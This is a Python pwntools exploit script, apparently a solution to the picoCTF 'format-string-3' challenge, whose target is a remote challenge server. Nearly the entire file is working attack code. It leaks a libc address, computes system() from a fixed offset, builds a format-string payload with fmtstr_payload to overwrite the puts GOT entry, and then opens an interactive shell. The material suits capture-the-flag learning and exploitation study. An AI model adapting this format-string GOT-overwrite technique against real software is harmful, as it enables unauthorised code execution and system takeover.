# Finalized Python program for exploitation.

from pwn import *

# Initializing pwntools.
check_security = ELF('./format-string-3')
context.binary = './format-string-3'

# Define HOST and PORT.
HOST = 'rhea.picoctf.net'
PORT = 49401

# Easily switching between local and remote environment.
DEBUG = False
if DEBUG == False:
    s = remote(HOST, PORT)
else:
    s = process('./format-string-3')

# Response after connection is made.
# First output from puts().
res = s.recvline().decode()
print(res)

# Second output from printf().
res = s.recvline().decode()
print(res)

# Input for entering offset value. Offset is 38.
offset = 38
print("Offset is:", offset)

# Extracting address of setvbuf from program output, then converting to integer format.
setvbuf_addr = int(res[len(res)-13:], 16)

# From setvbuf to system, the offset is 175,248.
from_setvbuf_to_system = 175248

# Since PIE is disabled, the GOT entry address will always be the same at 0x404018.
puts_got = int('404018', 16)

# Calculating address of system.
system_addr = setvbuf_addr - from_setvbuf_to_system

# Compiling the addresses into a dictionary.
addr_val = {puts_got: system_addr}

# Printing the hex addresses for reference only.
print("GOT address for puts() is:", hex(puts_got))
print("Address for system() is:", hex(system_addr))

# Constructing payload.
# write_size="byte" is equivalent to %hhn or 1-byte length at a time.
payload = fmtstr_payload(offset, addr_val, write_size="byte")
print("Payload length:", len(payload))

# Sending payload for exploit.
s.sendline(payload)
s.interactive()
